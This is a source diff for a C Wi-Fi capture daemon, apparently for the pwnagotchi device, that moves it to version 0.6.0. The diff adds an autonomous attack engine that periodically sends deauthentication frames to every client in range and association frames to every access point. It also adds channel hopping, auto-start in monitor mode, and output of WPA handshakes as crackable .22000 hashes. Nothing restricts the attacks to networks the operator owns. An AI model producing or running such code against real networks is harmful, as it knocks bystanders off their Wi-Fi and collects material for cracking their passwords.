@@ -20,16 +20,22 @@
 #include <string.h>
 #include <sys/epoll.h>
 #include <sys/stat.h>
+#include <sys/timerfd.h>
 #include <time.h>
 #include <unistd.h>
 
-#define DEFAULT_SOCK     "/tmp/wificapc.sock"
-#define DEFAULT_HS_DIR   "/tmp/wificapc/handshakes"
-#define WIFICAPC_VER     "0.5.0-dev"
+#define DEFAULT_SOCK     "/run/wificapc.sock"
+#define DEFAULT_HS_DIR   "/etc/pwnagotchi/handshakes"
+#define WIFICAPC_VER     "0.6.0"
 
-#define DEFAULT_AP_TTL_SEC   120
-#define DEFAULT_STA_TTL_SEC  300
-#define DEFAULT_HS_STALE_SEC 30
+#define DEFAULT_AP_TTL_SEC      120
+#define DEFAULT_STA_TTL_SEC     300
+#define DEFAULT_HS_STALE_SEC     30
+#define DEFAULT_HOP_INTERVAL_MS 250
+#define DEFAULT_ATTACK_INTERVAL_MS 5000
+
+static const int DEFAULT_CHANNELS[]   = {1,2,3,4,5,6,7,8,9,10,11,12,13};
+static const int DEFAULT_N_CHANNELS   = 13;
 
 struct app {
 	struct ipc        *ipc;
@@ -39,17 +45,19 @@ struct app {
 	struct table      *table;
 	struct capture    *capture;
 	struct handshake  *hs;
-	struct proc       *proc;
+	struct proc       *proc;   /* kept for future use; currently unused */
 	struct inject     *inject;
-	int                wpasec_enabled;
+	int                attack_fd;
 	time_t             started;
 };
 
 static struct app  *g_app;
 
-/* forward decls — used by handle_recon_start before their definitions appear */
+/* forward decls — used before their definitions appear */
 static int ensure_table(struct app *a);
 static int ensure_handshake(struct app *a);
+static int ensure_inject(struct app *a);
+static int ensure_hopper(struct app *a);
 
 /* ---- signals -------------------------------------------------------------- */
 
@@ -432,11 +440,6 @@ static int handle_recon_start(struct app *a, int fd, int64_t id)
 		return reply_error(a->ipc, fd, id, "table init failed");
 	if (ensure_handshake(a) < 0)
 		return reply_error(a->ipc, fd, id, "handshake init failed");
-	if (!a->proc) {
-		a->proc = proc_create(a->ipc);
-		if (!a->proc)
-			return reply_error(a->ipc, fd, id, "proc init failed");
-	}
 
 	if (!a->capture) {
 		a->capture = capture_create(&a->iface, a->table, a->hs, a->ipc);
@@ -638,33 +641,6 @@ static int emit_hs_event(struct app *a, const char *tag,
 	return ipc_broadcast(a->ipc, buf, pos);
 }
 
-/* Called when hcxpcapngtool finishes converting a per-pair pcap. */
-static void on_hcxpcapngtool_done(const char *pcap_path,
-                                  const char *hash22000_path,
-                                  int exit_code, void *user)
-{
-	struct app *a = user;
-	if (exit_code != 0) {
-		log_warn("hcxpcapngtool(%s) exited %d", pcap_path ? pcap_path : "?", exit_code);
-		return;
-	}
-	if (!hash22000_path) return;
-
-	/* Re-emit handshake.captured so subscribers get the .22000 path now. */
-	char ap_zero[6] = {0};
-	struct hs_emit_payload pl = {
-		.pcap_path       = pcap_path,
-		.hash22000_path  = hash22000_path,
-	};
-	memcpy(pl.ap_bssid, ap_zero, 6);
-	memcpy(pl.sta_mac,  ap_zero, 6);
-	emit_hs_event(a, "handshake.hash22000", &pl, hash22000_path);
-	log_info("hcxpcapngtool produced %s", hash22000_path);
-
-	if (a->wpasec_enabled)
-		(void)proc_run_wpasec(a->proc, pcap_path, NULL, a);
-}
-
 /* Called by handshake.c on every state-machine transition we report. */
 static void on_handshake_event(enum hs_event evt,
                                const struct hs_emit_payload *pl,
@@ -672,13 +648,15 @@ static void on_handshake_event(enum hs_event evt,
 {
 	struct app *a = user;
 	switch (evt) {
-	case HS_EVT_HANDSHAKE: emit_hs_event(a, "handshake.captured", pl, NULL); break;
-	case HS_EVT_PMKID:     emit_hs_event(a, "pmkid.captured",     pl, NULL); break;
+	case HS_EVT_HANDSHAKE:
+		emit_hs_event(a, "handshake.captured", pl, NULL);
+		break;
+	case HS_EVT_PMKID:
+		emit_hs_event(a, "pmkid.captured", pl, NULL);
+		break;
 	case HS_EVT_DONE:
-		emit_hs_event(a, "handshake.done", pl, NULL);
-		if (pl->pcap_path && a->proc)
-			(void)proc_run_hcxpcapngtool(a->proc, pl->pcap_path,
-			                             on_hcxpcapngtool_done, a);
+		/* .22000 was written directly by handshake.c; broadcast its path. */
+		emit_hs_event(a, "handshake.done", pl, pl->hash22000_path);
 		break;
 	}
 }
@@ -708,11 +686,145 @@ static int handle_set_handshake_dir(struct app *a, int fd, int64_t id, const cha
 	return reply_ok_empty(a->ipc, fd, id);
 }
 
+/* ---- autonomous attack engine --------------------------------------------- */
+
+static void on_attack_timer(int fd, uint32_t events, void *user)
+{
+	(void)events;
+	struct app *a = user;
+	uint64_t exp;
+	if (read(fd, &exp, sizeof exp) != (ssize_t)sizeof exp) return;
+
+	if (!a->table || !a->capture || !capture_is_running(a->capture)) return;
+	if (ensure_inject(a) < 0) return;
+
+	struct ap_record aps[TABLE_MAX_APS];
+	int n_aps = table_snapshot_aps(a->table, aps, TABLE_MAX_APS);
+	for (int i = 0; i < n_aps; i++) {
+		const char *ssid     = aps[i].ssid_len ? aps[i].ssid : NULL;
+		uint8_t     ssid_len = aps[i].ssid_len;
+		inject_assoc(a->inject, aps[i].bssid, ssid, ssid_len);
+	}
+
+	struct sta_record stas[TABLE_MAX_STAS];
+	int n_stas = table_snapshot_stas(a->table, stas, TABLE_MAX_STAS);
+	for (int i = 0; i < n_stas; i++) {
+		if (stas[i].have_ap)
+			inject_deauth(a->inject, stas[i].ap_bssid, stas[i].mac, 2, 7);
+	}
+
+	if (n_aps + n_stas > 0)
+		log_debug("attack: %d assoc + %d deauth sent", n_aps, n_stas);
+}
+
+static int start_attack_timer(struct app *a, int interval_ms)
+{
+	int fd = timerfd_create(CLOCK_MONOTONIC, TFD_NONBLOCK | TFD_CLOEXEC);
+	if (fd < 0) { log_err("timerfd_create: %s", strerror(errno)); return -1; }
+	struct itimerspec its = {
+		.it_interval = { .tv_sec  =  interval_ms / 1000,
+		                 .tv_nsec = (long)(interval_ms % 1000) * 1000000L },
+		.it_value    = { .tv_sec  =  interval_ms / 1000,
+		                 .tv_nsec = (long)(interval_ms % 1000) * 1000000L },
+	};
+	timerfd_settime(fd, 0, &its, NULL);
+	if (ipc_add_fd(a->ipc, fd, EPOLLIN, on_attack_timer, a) < 0) {
+		log_err("start_attack_timer: ipc_add_fd failed");
+		close(fd);
+		return -1;
+	}
+	return fd;
+}
+
+/* ---- auto-start: bring up monitor mode + recon + hopping at launch -------- */
+
+static int parse_channels(const char *s, int *out, int max)
+{
+	char buf[256];
+	snprintf(buf, sizeof buf, "%s", s);
+	int n = 0;
+	char *tok = strtok(buf, ",");
+	while (tok && n < max) {
+		int ch = atoi(tok);
+		if (ch > 0) out[n++] = ch;
+		tok = strtok(NULL, ",");
+	}
+	return n;
+}
+
+struct autostart_opts {
+	const char *iface;
+	const char *hs_dir;
+	const int  *channels;
+	int         n_channels;
+	int         hop_interval_ms;
+	int         attack;
+	int         attack_interval_ms;
+};
+
+static int autostart(struct app *a, const struct autostart_opts *o)
+{
+	if (iface_open(&a->iface, o->iface) < 0) {
+		log_err("autostart: iface_open(%s) failed", o->iface);
+		return -1;
+	}
+	a->iface_open = 1;
+	emit_event_iface_mode(a, a->iface.mode);
+
+	if (iface_set_mode(&a->iface, IFACE_MODE_MONITOR) < 0) {
+		log_err("autostart: set monitor mode on %s failed", o->iface);
+		return -1;
+	}
+	emit_event_iface_mode(a, IFACE_MODE_MONITOR);
+	log_info("autostart: %s in monitor mode", o->iface);
+
+	if (ensure_table(a) < 0 || ensure_handshake(a) < 0) {
+		log_err("autostart: table/handshake init failed");
+		return -1;
+	}
+	if (o->hs_dir) {
+		handshake_set_dir(a->hs, o->hs_dir);
+		log_info("autostart: handshakes → %s", o->hs_dir);
+	}
+
+	a->capture = capture_create(&a->iface, a->table, a->hs, a->ipc);
+	if (!a->capture || capture_start(a->capture) < 0) {
+		log_err("autostart: capture init/start failed");
+		return -1;
+	}
+	log_info("autostart: capturing on %s", o->iface);
+
+	if (o->n_channels > 0) {
+		if (ensure_hopper(a) < 0) {
+			log_err("autostart: hopper init failed");
+			return -1;
+		}
+		if (chanhop_start(a->hopper, o->channels, o->n_channels,
+		                  o->hop_interval_ms) < 0) {
+			log_err("autostart: chanhop_start failed");
+			return -1;
+		}
+		log_info("autostart: hopping %d channels at %dms",
+		         o->n_channels, o->hop_interval_ms);
+	}
+
+	if (o->attack) {
+		a->attack_fd = start_attack_timer(a, o->attack_interval_ms);
+		if (a->attack_fd < 0)
+			log_warn("autostart: attack timer failed — attacks disabled");
+		else
+			log_info("autostart: autonomous attacks enabled (%dms interval)",
+			         o->attack_interval_ms);
+	}
+
+	return 0;
+}
+
 static int handle_set_wpasec(struct app *a, int fd, int64_t id, const char *args)
 {
 	int64_t en = 0;
 	if (args) (void)proto_args_get_int(args, "enabled", &en);
-	a->wpasec_enabled = en ? 1 : 0;
+	(void)a;
 	return reply_ok_empty(a->ipc, fd, id);
 }
 
@@ -907,6 +1019,14 @@ struct opts {
 	mode_t      sock_mode;
 	int         foreground;
 	int         debug;
+	/* auto-start */
+	const char *iface;
+	const char *hs_dir;
+	int         channels[CHANHOP_MAX_CHANNELS];
+	int         n_channels;
+	int         hop_interval_ms;
+	int         attack;
+	int         attack_interval_ms;
 };
 
 static void usage(FILE *f, const char *argv0)
@@ -915,28 +1035,48 @@ static void usage(FILE *f, const char *argv0)
 	    "wificapc " WIFICAPC_VER " — native 802.11 capture daemon\n"
 	    "\n"
 	    "Usage: %s [options]\n"
-	    "  -s, --socket PATH   Unix socket path (default: " DEFAULT_SOCK ")\n"
-	    "  -m, --mode  OCTAL   Socket file mode (default: 0660)\n"
-	    "  -f, --foreground    Stay in foreground, log to stderr\n"
-	    "  -d, --debug         Enable debug logging\n"
-	    "  -h, --help          Show this help\n"
-	    "  -V, --version       Print version and exit\n",
-	    argv0);
+	    "  -s, --socket   PATH    Unix socket path (default: " DEFAULT_SOCK ")\n"
+	    "  -m, --mode     OCTAL   Socket file mode (default: 0660)\n"
+	    "  -f, --foreground       Stay in foreground, log to stderr\n"
+	    "  -d, --debug            Enable debug logging\n"
+	    "  -h, --help             Show this help\n"
+	    "  -V, --version          Print version and exit\n"
+	    "\n"
+	    "Auto-start (all required when using -i):\n"
+	    "  -i, --iface      IFACE   Monitor-mode interface (e.g. wlan0)\n"
+	    "  -H, --hs-dir     PATH    Handshake .22000 output directory\n"
+	    "                           (default: " DEFAULT_HS_DIR ")\n"
+	    "  -C, --channels   LIST    Comma-separated channels to hop\n"
+	    "                           (default: 1-13)\n"
+	    "      --hop-interval MS    Channel dwell time ms (default: %d)\n"
+	    "  -A, --attack             Enable autonomous deauth+assoc attacks\n"
+	    "      --attack-interval MS Attack period ms (default: %d)\n",
+	    argv0, DEFAULT_HOP_INTERVAL_MS, DEFAULT_ATTACK_INTERVAL_MS);
 }
 
 static int parse_opts(int argc, char **argv, struct opts *o)
 {
+	enum {
+		OPT_HOP_INTERVAL = 256,
+		OPT_ATTACK_INTERVAL,
+	};
 	static const struct option longopts[] = {
-		{ "socket",     required_argument, NULL, 's' },
-		{ "mode",       required_argument, NULL, 'm' },
-		{ "foreground", no_argument,       NULL, 'f' },
-		{ "debug",      no_argument,       NULL, 'd' },
-		{ "help",       no_argument,       NULL, 'h' },
-		{ "version",    no_argument,       NULL, 'V' },
+		{ "socket",           required_argument, NULL, 's' },
+		{ "mode",             required_argument, NULL, 'm' },
+		{ "foreground",       no_argument,       NULL, 'f' },
+		{ "debug",            no_argument,       NULL, 'd' },
+		{ "help",             no_argument,       NULL, 'h' },
+		{ "version",          no_argument,       NULL, 'V' },
+		{ "iface",            required_argument, NULL, 'i' },
+		{ "hs-dir",           required_argument, NULL, 'H' },
+		{ "channels",         required_argument, NULL, 'C' },
+		{ "attack",           no_argument,       NULL, 'A' },
+		{ "hop-interval",     required_argument, NULL, OPT_HOP_INTERVAL },
+		{ "attack-interval",  required_argument, NULL, OPT_ATTACK_INTERVAL },
 		{ 0 },
 	};
 	int c;
-	while ((c = getopt_long(argc, argv, "s:m:fdhV", longopts, NULL)) != -1) {
+	while ((c = getopt_long(argc, argv, "s:m:fdhVi:H:C:A", longopts, NULL)) != -1) {
 		switch (c) {
 		case 's': o->sock_path = optarg; break;
 		case 'm': o->sock_mode = (mode_t)strtol(optarg, NULL, 8); break;
@@ -944,6 +1084,15 @@ static int parse_opts(int argc, char **argv, struct opts *o)
 		case 'd': o->debug = 1; break;
 		case 'h': usage(stdout, argv[0]); return 1;
 		case 'V': printf("wificapc %s\n", WIFICAPC_VER); return 1;
+		case 'i': o->iface = optarg; break;
+		case 'H': o->hs_dir = optarg; break;
+		case 'C':
+			o->n_channels = parse_channels(optarg, o->channels,
+			                               CHANHOP_MAX_CHANNELS);
+			break;
+		case 'A': o->attack = 1; break;
+		case OPT_HOP_INTERVAL:    o->hop_interval_ms    = atoi(optarg); break;
+		case OPT_ATTACK_INTERVAL: o->attack_interval_ms = atoi(optarg); break;
 		default:  usage(stderr, argv[0]); return -1;
 		}
 	}
@@ -953,14 +1102,24 @@ static int parse_opts(int argc, char **argv, struct opts *o)
 int main(int argc, char **argv)
 {
 	struct opts o = {
-		.sock_path  = DEFAULT_SOCK,
-		.sock_mode  = 0660,
-		.foreground = 1,
-		.debug      = 0,
+		.sock_path           = DEFAULT_SOCK,
+		.sock_mode           = 0660,
+		.foreground          = 1,
+		.debug               = 0,
+		.hs_dir              = DEFAULT_HS_DIR,
+		.hop_interval_ms     = DEFAULT_HOP_INTERVAL_MS,
+		.attack_interval_ms  = DEFAULT_ATTACK_INTERVAL_MS,
 	};
 
 	int rc = parse_opts(argc, argv, &o);
 	if (rc != 0) return rc < 0 ? 1 : 0;
+
+	/* If --iface was given but no --channels, use the default 2.4 GHz list. */
+	if (o.iface && o.n_channels == 0) {
+		for (int i = 0; i < DEFAULT_N_CHANNELS; i++)
+			o.channels[i] = DEFAULT_CHANNELS[i];
+		o.n_channels = DEFAULT_N_CHANNELS;
+	}
 
 	log_init(o.debug ? LL_DEBUG : LL_INFO, !o.foreground);
 	log_info("wificapc %s starting", WIFICAPC_VER);
@@ -969,7 +1128,8 @@ int main(int argc, char **argv)
 	install_signals();
 
 	struct app a = {0};
-	a.started = time(NULL);
+	a.started    = time(NULL);
+	a.attack_fd  = -1;
 
 	a.ipc = ipc_create(o.sock_path, o.sock_mode);
 	if (!a.ipc) {
@@ -979,11 +1139,25 @@ int main(int argc, char **argv)
 	g_app = &a;
 	ipc_set_on_line(a.ipc, on_line, &a);
 
+	if (o.iface) {
+		struct autostart_opts ao = {
+			.iface              = o.iface,
+			.hs_dir             = o.hs_dir,
+			.channels           = o.channels,
+			.n_channels         = o.n_channels,
+			.hop_interval_ms    = o.hop_interval_ms,
+			.attack             = o.attack,
+			.attack_interval_ms = o.attack_interval_ms,
+		};
+		if (autostart(&a, &ao) < 0) {
+			log_err("autostart failed — continuing in command-only mode");
+		}
+	}
+
 	int run_rc = ipc_run(a.ipc);
 
 	log_info("shutting down");
-	/* inject is a thin wrapper around capture's socket — destroy it BEFORE
-	 * capture closes the fd. */
+	if (a.attack_fd >= 0) { ipc_remove_fd(a.ipc, a.attack_fd); close(a.attack_fd); }
 	if (a.inject)  inject_destroy(a.inject);
 	if (a.capture) capture_destroy(a.capture);
 	if (a.hopper)  chanhop_destroy(a.hopper);
